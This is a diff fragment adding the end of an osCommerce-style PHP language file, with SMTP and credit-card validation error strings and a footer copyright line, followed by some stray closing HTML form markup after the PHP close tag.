+define('ERROR_TEP_MAIL', '<font face="Verdana, Arial" size="2" color="#ff0000"><strong><small>TEP ERROR:</small> Cannot send the email through the specified SMTP server. Please check your php.ini setting and correct the SMTP server if necessary.</strong></font>');
+
+define('TEXT_CCVAL_ERROR_INVALID_DATE', 'The expiry date entered for the credit card is invalid. Please check the date and try again.');
+define('TEXT_CCVAL_ERROR_INVALID_NUMBER', 'The credit card number entered is invalid. Please check the number and try again.');
+define('TEXT_CCVAL_ERROR_UNKNOWN_CARD', 'The first four digits of the number entered are: %s. If that number is correct, we do not accept that type of credit card. If it is wrong, please try again.');
+
+define('FOOTER_TEXT_BODY', 'Copyright &copy; ' . date('Y') . ' <a href="' . tep_href_link(FILENAME_DEFAULT) . '">' . STORE_NAME . '</a><br />Powered by <a href="http://www.oscommerce.com" target="_blank">osCommerce</a>');
+?>
+" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
